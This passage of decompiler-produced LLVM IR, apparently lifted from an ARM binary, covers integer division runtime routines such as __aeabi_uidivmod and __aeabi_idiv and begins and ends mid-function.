  %v1_1a0c451 = phi i32 [ %v3_1a0b4, %bb83 ], [ %v1_1a0b4, %bb82 ], [ %v1_1a0b4, %dec_label_pc_1a0ac ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a0c4

dec_label_pc_1a0c4:                               ; preds = %.thread11, %dec_label_pc_1a0c0
  %v1_1a0f8 = phi i32 [ %v4_1a0f8, %.thread11 ], [ %v2_1a0cc59, %dec_label_pc_1a0c0 ]
  %v1_1a0cc = phi i32 [ %v0_1a104, %.thread11 ], [ 0, %dec_label_pc_1a0c0 ]
  %v1_1a0fc = phi i32 [ %v4_1a0fc, %.thread11 ], [ %v1_1a0c451, %dec_label_pc_1a0c0 ]
  %v1_1a0c8 = phi i32 [ %v0_1a0f4, %.thread11 ], [ %v0_1a078, %dec_label_pc_1a0c0 ]
  %v3_1a0c4 = icmp ult i32 %v1_1a0c8, %v1_1a0fc
  br i1 %v3_1a0c4, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_1a0c4
  %v3_1a0c8 = sub i32 %v1_1a0c8, %v1_1a0fc
  store i32 %v3_1a0c8, i32* %r0.global-to-local, align 4
  %v3_1a0cc = or i32 %v1_1a0cc, %v1_1a0f8
  store i32 %v3_1a0cc, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1a0c4, %bb84
  %v1_1a0d4 = phi i32 [ %v1_1a0c8, %dec_label_pc_1a0c4 ], [ %v3_1a0c8, %bb84 ]
  %v1_1a0d8 = phi i32 [ %v1_1a0cc, %dec_label_pc_1a0c4 ], [ %v3_1a0cc, %bb84 ]
  %v4_1a0d0 = udiv i32 %v1_1a0fc, 2
  %v6_1a0d0 = icmp ult i32 %v1_1a0d4, %v4_1a0d0
  br i1 %v6_1a0d0, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_1a0d4 = urem i32 %v1_1a0fc, 2
  %v4_1a0d4 = icmp eq i32 %v3_1a0d4, 0
  %v6_1a0d4 = sub i32 %v1_1a0d4, %v4_1a0d0
  store i32 %v6_1a0d4, i32* %r0.global-to-local, align 4
  br i1 %v4_1a0d4, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_1a0d8 = udiv i32 %v1_1a0f8, 2
  %v6_1a0d8 = or i32 %v1_1a0d8, %v5_1a0d8
  store i32 %v6_1a0d8, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1a0e0 = phi i32 [ %v6_1a0d4, %bb85 ], [ %v1_1a0d4, %.thread7 ], [ %v6_1a0d4, %bb86 ]
  %v1_1a0e4 = phi i32 [ %v1_1a0d8, %bb85 ], [ %v1_1a0d8, %.thread7 ], [ %v6_1a0d8, %bb86 ]
  %v4_1a0dc = udiv i32 %v1_1a0fc, 4
  %v6_1a0dc = icmp ult i32 %v1_1a0e0, %v4_1a0dc
  br i1 %v6_1a0dc, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1a0e0 = and i32 %v1_1a0fc, 2
  %v4_1a0e0 = icmp eq i32 %v3_1a0e0, 0
  %v6_1a0e0 = sub i32 %v1_1a0e0, %v4_1a0dc
  store i32 %v6_1a0e0, i32* %r0.global-to-local, align 4
  br i1 %v4_1a0e0, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1a0e4 = udiv i32 %v1_1a0f8, 4
  %v6_1a0e4 = or i32 %v1_1a0e4, %v5_1a0e4
  store i32 %v6_1a0e4, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_1a0ec = phi i32 [ %v6_1a0e0, %bb87 ], [ %v1_1a0e0, %.thread8 ], [ %v6_1a0e0, %bb88 ]
  %v1_1a0f0 = phi i32 [ %v1_1a0e4, %bb87 ], [ %v1_1a0e4, %.thread8 ], [ %v6_1a0e4, %bb88 ]
  %v4_1a0e8 = udiv i32 %v1_1a0fc, 8
  %v6_1a0e8 = icmp ult i32 %v1_1a0ec, %v4_1a0e8
  br i1 %v6_1a0e8, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_1a0ec = and i32 %v1_1a0fc, 4
  %v4_1a0ec = icmp eq i32 %v3_1a0ec, 0
  %v6_1a0ec = sub i32 %v1_1a0ec, %v4_1a0e8
  store i32 %v6_1a0ec, i32* %r0.global-to-local, align 4
  br i1 %v4_1a0ec, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1a0f0 = udiv i32 %v1_1a0f8, 8
  %v6_1a0f0 = or i32 %v1_1a0f0, %v5_1a0f0
  store i32 %v6_1a0f0, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_1a104 = phi i32 [ %v1_1a0f0, %bb89 ], [ %v1_1a0f0, %.thread9 ], [ %v6_1a0f0, %bb90 ]
  %v0_1a0f4 = phi i32 [ %v6_1a0ec, %bb89 ], [ %v1_1a0ec, %.thread9 ], [ %v6_1a0ec, %bb90 ]
  %v2_1a0f4 = icmp eq i32 %v0_1a0f4, 0
  br i1 %v2_1a0f4, label %dec_label_pc_1a104, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_1a0f8, 16
  br i1 %tmp138, label %dec_label_pc_1a104, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_1a0f8 = udiv i32 %v1_1a0f8, 16
  %v4_1a0fc = udiv i32 %v1_1a0fc, 16
  br label %dec_label_pc_1a0c4

dec_label_pc_1a104:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_1a104, i32* %r0.global-to-local, align 4
  ret i32 %v0_1a104

dec_label_pc_1a10c:                               ; preds = %dec_label_pc_1a078
  %v9_1a078 = icmp eq i32 %v0_1a078, %v1_1a078
  %. = zext i1 %v9_1a078 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_1a118:                               ; preds = %dec_label_pc_1a080
  %v2_1a118 = icmp ugt i32 %v1_1a078, 65535
  br i1 %v2_1a118, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_1a118
  %v2_1a11c = and i32 %v1_1a078, 32768
  %v3_1a11c = icmp eq i32 %v2_1a11c, 0
  %v4_1a11c = udiv i32 %v1_1a078, 65536
  br i1 %v3_1a11c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_1a118
  %v0_1a12865 = phi i32 [ %v1_1a078, %dec_label_pc_1a118 ], [ %v4_1a11c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_1a12c = phi i32 [ %v0_1a12865, %.thread16 ], [ %v4_1a11c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1a128 = icmp ugt i32 %v1_1a12c, 255
  br i1 %v2_1a128, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_1a12c = and i32 %v1_1a12c, 128
  %v3_1a12c = icmp eq i32 %v2_1a12c, 0
  %v4_1a12c = udiv i32 %v1_1a12c, 256
  br i1 %v3_1a12c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_1a130 = or i32 %storemerge, 8
  store i32 %v2_1a130, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_1a13c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_1a130, %bb98 ]
  %v1_1a138 = phi i32 [ %v1_1a12c, %bb96 ], [ %v4_1a12c, %bb97 ], [ %v4_1a12c, %bb98 ]
  %v2_1a134 = icmp ugt i32 %v1_1a138, 15
  br i1 %v2_1a134, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_1a138 = and i32 %v1_1a138, 8
  %v3_1a138 = icmp eq i32 %v2_1a138, 0
  %v4_1a138 = udiv i32 %v1_1a138, 16
  br i1 %v3_1a138, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1a13c = add nsw i32 %v1_1a13c, 4
  store i32 %v2_1a13c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_1a144 = phi i32 [ %v1_1a13c, %.thread17 ], [ %v1_1a13c, %bb99 ], [ %v2_1a13c, %bb100 ]
  %v5_1a148 = phi i32 [ %v1_1a138, %.thread17 ], [ %v4_1a138, %bb99 ], [ %v4_1a138, %bb100 ]
  %v2_1a140 = icmp ugt i32 %v5_1a148, 3
  %v7_1a140 = icmp eq i32 %v5_1a148, 4
  %v2_1a144 = xor i1 %v7_1a140, true
  %v3_1a144 = and i1 %v2_1a140, %v2_1a144
  br i1 %v3_1a144, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_1a144 = add nsw i32 %v4_1a144, 3
  store i32 %v5_1a144, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_1a148 = phi i32 [ %v4_1a144, %.thread18 ], [ %v5_1a144, %bb101 ]
  %v2_1a148 = xor i1 %v2_1a140, true
  %v3_1a148 = or i1 %v7_1a140, %v2_1a148
  br i1 %v3_1a148, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_1a148 = udiv i32 %v5_1a148, 2
  %v9_1a148 = add i32 %v4_1a148, %v8_1a148
  store i32 %v9_1a148, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_1a14c = phi i32 [ %v4_1a148, %bb102 ], [ %v9_1a148, %bb103 ]
  %v6_1a14c = lshr i32 %v0_1a078, %v1_1a14c
  store i32 %v6_1a14c, i32* %r0.global-to-local, align 4
  ret i32 %v6_1a14c

dec_label_pc_1a154:                               ; preds = %entry
  %v0_1a158 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a148, { 1, 0 }
  uselistorder i1 %v7_1a140, { 1, 0 }
  uselistorder i32 %v4_1a138, { 1, 0 }
  uselistorder i32 %v1_1a138, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1a130, { 1, 0 }
  uselistorder i32 %v4_1a12c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a12c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a11c, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_1a0f4, { 1, 0 }
  uselistorder i32 %v0_1a104, { 1, 0, 2 }
  uselistorder i32 %v4_1a0e8, { 1, 0 }
  uselistorder i32 %v1_1a0f0, { 1, 2, 0 }
  uselistorder i32 %v4_1a0dc, { 1, 0 }
  uselistorder i32 %v1_1a0e4, { 1, 2, 0 }
  uselistorder i32 %v4_1a0d0, { 1, 0 }
  uselistorder i32 %v1_1a0d8, { 1, 2, 0 }
  uselistorder i32 %v1_1a0fc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a0cc, { 1, 0 }
  uselistorder i32 %v1_1a0f8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a0b8, { 1, 0 }
  uselistorder i32 %v3_1a0b4, { 1, 0 }
  uselistorder i32 %v1_1a0b4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1a0b8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a0a4, { 1, 0 }
  uselistorder i32 %v4_1a0a0, { 2, 1, 0 }
  uselistorder i32 %v1_1a0a4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a0ac.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_1a078, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_1a078, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_1a06c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_1a104, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1a0c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a0acthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a16c = udiv i32 %arg1, %arg2
  ret i32 %v2_1a16c
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1a180 = load i32, i32* @r1, align 4
  %v1_1a180 = icmp slt i32 %v0_1a180, 0
  %v2_1a180 = icmp eq i32 %v0_1a180, 0
  %v2_1a184 = xor i32 %v0_1a180, %arg1
  br i1 %v2_1a180, label %dec_label_pc_1a298, label %dec_label_pc_1a18c

dec_label_pc_1a18c:                               ; preds = %entry
  br i1 %v1_1a180, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1a18c
  %v2_1a18c = sub i32 0, %v0_1a180
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1a18c, %bb
  %v1_1a258 = phi i32 [ %v2_1a18c, %bb ], [ %v0_1a180, %dec_label_pc_1a18c ]
  %v1_1a190 = add i32 %v1_1a258, -1
  %v7_1a190 = icmp eq i32 %v1_1a258, 1
  br i1 %v7_1a190, label %dec_label_pc_1a238, label %dec_label_pc_1a198

dec_label_pc_1a198:                               ; preds = %thread-pre-split
  %v1_1a198 = icmp slt i32 %arg1, 0
  br i1 %v1_1a198, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1a198
  %v2_1a19c = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1a198, %bb85
  %v0_1a28c = phi i32 [ %arg1, %dec_label_pc_1a198 ], [ %v2_1a19c, %bb85 ]
  %v3_1a1a0 = icmp uge i32 %v0_1a28c, %v1_1a258
  %v9_1a1a0 = icmp eq i32 %v0_1a28c, %v1_1a258
  %v2_1a1a4 = xor i1 %v3_1a1a0, true
  %v3_1a1a4 = or i1 %v9_1a1a0, %v2_1a1a4
  br i1 %v3_1a1a4, label %dec_label_pc_1a244, label %dec_label_pc_1a1a8

dec_label_pc_1a1a8:                               ; preds = %bb86
  %v2_1a1a8 = and i32 %v1_1a190, %v1_1a258
  %v4_1a1a8 = icmp eq i32 %v2_1a1a8, 0
  br i1 %v4_1a1a8, label %dec_label_pc_1a254, label %dec_label_pc_1a1b0

dec_label_pc_1a1b0:                               ; preds = %dec_label_pc_1a1a8
  %v3_1a1b0 = icmp ult i32 %v1_1a258, 536870912
  br i1 %v3_1a1b0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a1b0
  %v4_1a1b4 = mul i32 %v1_1a258, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a1b0, %.thread
  %v0_1a1d4.pr40.ph = phi i32 [ %v4_1a1b4, %.thread ], [ %v1_1a258, %dec_label_pc_1a1b0 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a1b0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1a1d4.pr40 = phi i32 [ %v4_1a1c8, %bb89 ], [ %v0_1a1d4.pr40.ph, %.preheader.preheader ]
  %v1_1a1cc = phi i32 [ %v4_1a1cc, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1a1c0 = icmp ugt i32 %v0_1a1d4.pr40, 268435455
  br i1 %v2_1a1c0, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1a1d4thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1a1c4 = icmp ult i32 %v0_1a1d4.pr40, %v0_1a28c
  br i1 %v4_1a1c4, label %bb88, label %dec_label_pc_1a1d4thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1a1c8 = and i32 %v0_1a1d4.pr40, 268435456
  %v3_1a1c8 = icmp eq i32 %v2_1a1c8, 0
  %v4_1a1c8 = mul i32 %v0_1a1d4.pr40, 16
  br i1 %v3_1a1c8, label %bb89, label %dec_label_pc_1a1d4.loopexit

bb89:                                             ; preds = %bb88
  %v2_1a1cc = and i32 %v1_1a1cc, 268435456
  %v3_1a1cc = icmp eq i32 %v2_1a1cc, 0
  %v4_1a1cc = mul i32 %v1_1a1cc, 16
  br i1 %v3_1a1cc, label %.preheader, label %dec_label_pc_1a1d4thread-pre-split.loopexit.loopexit

dec_label_pc_1a1d4thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1a1e052.ph = phi i32 [ %v1_1a1cc, %bb87 ], [ %v4_1a1cc, %bb89 ]
  %v0_1a1d4.pr42.ph = phi i32 [ %v0_1a1d4.pr40, %bb87 ], [ %v4_1a1c8, %bb89 ]
  br label %dec_label_pc_1a1d4thread-pre-split.loopexit

dec_label_pc_1a1d4thread-pre-split.loopexit:      ; preds = %dec_label_pc_1a1d4thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1a1e052 = phi i32 [ %v1_1a1cc, %.thread3 ], [ %v1_1a1e052.ph, %dec_label_pc_1a1d4thread-pre-split.loopexit.loopexit ]
  %v0_1a1d4.pr42 = phi i32 [ %v0_1a1d4.pr40, %.thread3 ], [ %v0_1a1d4.pr42.ph, %dec_label_pc_1a1d4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a1d4thread-pre-split

dec_label_pc_1a1d4thread-pre-split:               ; preds = %dec_label_pc_1a1d4thread-pre-split.loopexit, %bb91
  %v1_1a1e050 = phi i32 [ %v1_1a1e052, %dec_label_pc_1a1d4thread-pre-split.loopexit ], [ %v3_1a1e0, %bb91 ]
  %v2_1a1d848 = phi i32 [ %v0_1a28c, %dec_label_pc_1a1d4thread-pre-split.loopexit ], [ %v2_1a1d8, %bb91 ]
  %v0_1a1d4.pr = phi i32 [ %v0_1a1d4.pr42, %dec_label_pc_1a1d4thread-pre-split.loopexit ], [ %v3_1a1dc, %bb91 ]
  br label %dec_label_pc_1a1d4

dec_label_pc_1a1d4.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1a1d4

dec_label_pc_1a1d4:                               ; preds = %dec_label_pc_1a1d4.loopexit, %dec_label_pc_1a1d4thread-pre-split
  %v1_1a1e0 = phi i32 [ %v1_1a1e050, %dec_label_pc_1a1d4thread-pre-split ], [ %v1_1a1cc, %dec_label_pc_1a1d4.loopexit ]
  %v2_1a1d8 = phi i32 [ %v2_1a1d848, %dec_label_pc_1a1d4thread-pre-split ], [ %v0_1a28c, %dec_label_pc_1a1d4.loopexit ]
  %v1_1a1dc = phi i32 [ %v0_1a1d4.pr, %dec_label_pc_1a1d4thread-pre-split ], [ %v4_1a1c8, %dec_label_pc_1a1d4.loopexit ]
  %v2_1a1d4 = icmp slt i32 %v1_1a1dc, 0
  br i1 %v2_1a1d4, label %dec_label_pc_1a1e8, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a1d4
  %v4_1a1d8 = icmp ult i32 %v1_1a1dc, %v2_1a1d8
  br i1 %v4_1a1d8, label %bb91, label %dec_label_pc_1a1e8

bb91:                                             ; preds = %bb90
  %v3_1a1dc = mul i32 %v1_1a1dc, 2
  %v2_1a1e0 = icmp slt i32 %v1_1a1e0, 0
  %v3_1a1e0 = mul i32 %v1_1a1e0, 2
  br i1 %v2_1a1e0, label %dec_label_pc_1a1e8, label %dec_label_pc_1a1d4thread-pre-split

dec_label_pc_1a1e8:                               ; preds = %bb90, %dec_label_pc_1a1d4, %bb91
  %v2_1a1f463 = phi i32 [ %v3_1a1e0, %bb91 ], [ %v1_1a1e0, %bb90 ], [ %v1_1a1e0, %dec_label_pc_1a1d4 ]
  %v1_1a1ec55 = phi i32 [ %v3_1a1dc, %bb91 ], [ %v1_1a1dc, %bb90 ], [ %v1_1a1dc, %dec_label_pc_1a1d4 ]
  br label %dec_label_pc_1a1ec

dec_label_pc_1a1ec:                               ; preds = %.thread13, %dec_label_pc_1a1e8
  %v1_1a220 = phi i32 [ %v4_1a220, %.thread13 ], [ %v2_1a1f463, %dec_label_pc_1a1e8 ]
  %v1_1a1f4 = phi i32 [ %v1_1a230, %.thread13 ], [ 0, %dec_label_pc_1a1e8 ]
  %v1_1a224 = phi i32 [ %v4_1a224, %.thread13 ], [ %v1_1a1ec55, %dec_label_pc_1a1e8 ]
  %v1_1a1f0 = phi i32 [ %v0_1a21c, %.thread13 ], [ %v0_1a28c, %dec_label_pc_1a1e8 ]
  %v3_1a1ec = icmp ult i32 %v1_1a1f0, %v1_1a224
  br i1 %v3_1a1ec, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1a1ec
  %v3_1a1f0 = sub i32 %v1_1a1f0, %v1_1a224
  %v3_1a1f4 = or i32 %v1_1a1f4, %v1_1a220
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a1ec, %bb92
  %v1_1a1fc = phi i32 [ %v1_1a1f0, %dec_label_pc_1a1ec ], [ %v3_1a1f0, %bb92 ]
  %v1_1a200 = phi i32 [ %v1_1a1f4, %dec_label_pc_1a1ec ], [ %v3_1a1f4, %bb92 ]
  %v4_1a1f8 = udiv i32 %v1_1a224, 2
  %v6_1a1f8 = icmp ult i32 %v1_1a1fc, %v4_1a1f8
  br i1 %v6_1a1f8, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1a1fc = urem i32 %v1_1a224, 2
  %v4_1a1fc = icmp eq i32 %v3_1a1fc, 0
  %v6_1a1fc = sub i32 %v1_1a1fc, %v4_1a1f8
  br i1 %v4_1a1fc, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1a200 = udiv i32 %v1_1a220, 2
  %v6_1a200 = or i32 %v1_1a200, %v5_1a200
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1a208 = phi i32 [ %v6_1a1fc, %bb93 ], [ %v1_1a1fc, %.thread8 ], [ %v6_1a1fc, %bb94 ]
  %v1_1a20c = phi i32 [ %v1_1a200, %bb93 ], [ %v1_1a200, %.thread8 ], [ %v6_1a200, %bb94 ]
  %v4_1a204 = udiv i32 %v1_1a224, 4
  %v6_1a204 = icmp ult i32 %v1_1a208, %v4_1a204
  br i1 %v6_1a204, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1a208 = and i32 %v1_1a224, 2
  %v4_1a208 = icmp eq i32 %v3_1a208, 0
  %v6_1a208 = sub i32 %v1_1a208, %v4_1a204
  br i1 %v4_1a208, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1a20c = udiv i32 %v1_1a220, 4
  %v6_1a20c = or i32 %v1_1a20c, %v5_1a20c
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1a214 = phi i32 [ %v6_1a208, %bb95 ], [ %v1_1a208, %.thread9 ], [ %v6_1a208, %bb96 ]
  %v1_1a218 = phi i32 [ %v1_1a20c, %bb95 ], [ %v1_1a20c, %.thread9 ], [ %v6_1a20c, %bb96 ]
  %v4_1a210 = udiv i32 %v1_1a224, 8
  %v6_1a210 = icmp ult i32 %v1_1a214, %v4_1a210
  br i1 %v6_1a210, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1a214 = and i32 %v1_1a224, 4
  %v4_1a214 = icmp eq i32 %v3_1a214, 0
  %v6_1a214 = sub i32 %v1_1a214, %v4_1a210
  br i1 %v4_1a214, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1a218 = udiv i32 %v1_1a220, 8
  %v6_1a218 = or i32 %v1_1a218, %v5_1a218
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1a230 = phi i32 [ %v1_1a218, %bb97 ], [ %v1_1a218, %.thread10 ], [ %v6_1a218, %bb98 ]
  %v0_1a21c = phi i32 [ %v6_1a214, %bb97 ], [ %v1_1a214, %.thread10 ], [ %v6_1a214, %bb98 ]
  %v2_1a21c = icmp eq i32 %v0_1a21c, 0
  br i1 %v2_1a21c, label %dec_label_pc_1a22c, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1a220, 16
  br i1 %tmp, label %dec_label_pc_1a22c, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1a220 = udiv i32 %v1_1a220, 16
  %v4_1a224 = udiv i32 %v1_1a224, 16
  br label %dec_label_pc_1a1ec

dec_label_pc_1a22c:                               ; preds = %thread-pre-split12, %bb99
  %v1_1a22c = icmp slt i32 %v2_1a184, 0
  br i1 %v1_1a22c, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1a22c
  %v2_1a230 = sub i32 0, %v1_1a230
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1a238, %dec_label_pc_1a22c, %bb100
  %v1_1a234 = phi i32 [ %v1_1a230, %dec_label_pc_1a22c ], [ %v2_1a230, %bb100 ], [ %arg1, %dec_label_pc_1a238 ], [ %v2_1a23c, %bb101 ], [ %v1_1a25080, %bb103 ], [ %v2_1a24c, %bb104 ]
  ret i32 %v1_1a234

dec_label_pc_1a238:                               ; preds = %thread-pre-split
  br i1 %v1_1a180, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1a238
  %v2_1a23c = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1a244:                               ; preds = %bb86
  br i1 %v3_1a1a0, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1a244
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1a244, %bb102
  %v1_1a25080 = phi i32 [ %arg1, %dec_label_pc_1a244 ], [ 0, %bb102 ]
  br i1 %v9_1a1a0, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1a248 = ashr i32 %v2_1a184, 31
  %v2_1a24c = or i32 %v4_1a248, 1
  br label %.thread16

dec_label_pc_1a254:                               ; preds = %dec_label_pc_1a1a8
  %v2_1a254 = icmp ugt i32 %v1_1a258, 65535
  br i1 %v2_1a254, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1a254
  %v2_1a258 = and i32 %v1_1a258, 32768
  %v3_1a258 = icmp eq i32 %v2_1a258, 0
  %v4_1a258 = udiv i32 %v1_1a258, 65536
  br i1 %v3_1a258, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1a254
  %v0_1a26470 = phi i32 [ %v1_1a258, %dec_label_pc_1a254 ], [ %v4_1a258, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1a268 = phi i32 [ %v0_1a26470, %.thread19 ], [ %v4_1a258, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1a264 = icmp ugt i32 %v1_1a268, 255
  br i1 %v2_1a264, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1a268 = and i32 %v1_1a268, 128
  %v3_1a268 = icmp eq i32 %v2_1a268, 0
  %v4_1a268 = udiv i32 %v1_1a268, 256
  br i1 %v3_1a268, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1a26c = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1a278 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1a26c, %bb108 ]
  %v1_1a274 = phi i32 [ %v1_1a268, %bb106 ], [ %v4_1a268, %bb107 ], [ %v4_1a268, %bb108 ]
  %v2_1a270 = icmp ugt i32 %v1_1a274, 15
  br i1 %v2_1a270, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1a274 = and i32 %v1_1a274, 8
  %v3_1a274 = icmp eq i32 %v2_1a274, 0
  %v4_1a274 = udiv i32 %v1_1a274, 16
  br i1 %v3_1a274, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1a278 = add nsw i32 %v1_1a278, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1a280 = phi i32 [ %v1_1a278, %.thread20 ], [ %v1_1a278, %bb109 ], [ %v2_1a278, %bb110 ]
  %v5_1a284 = phi i32 [ %v1_1a274, %.thread20 ], [ %v4_1a274, %bb109 ], [ %v4_1a274, %bb110 ]
  %v2_1a27c = icmp ugt i32 %v5_1a284, 3
  %v7_1a27c = icmp eq i32 %v5_1a284, 4
  %v2_1a280 = xor i1 %v7_1a27c, true
  %v3_1a280 = and i1 %v2_1a27c, %v2_1a280
  br i1 %v3_1a280, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1a280 = add nsw i32 %v4_1a280, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
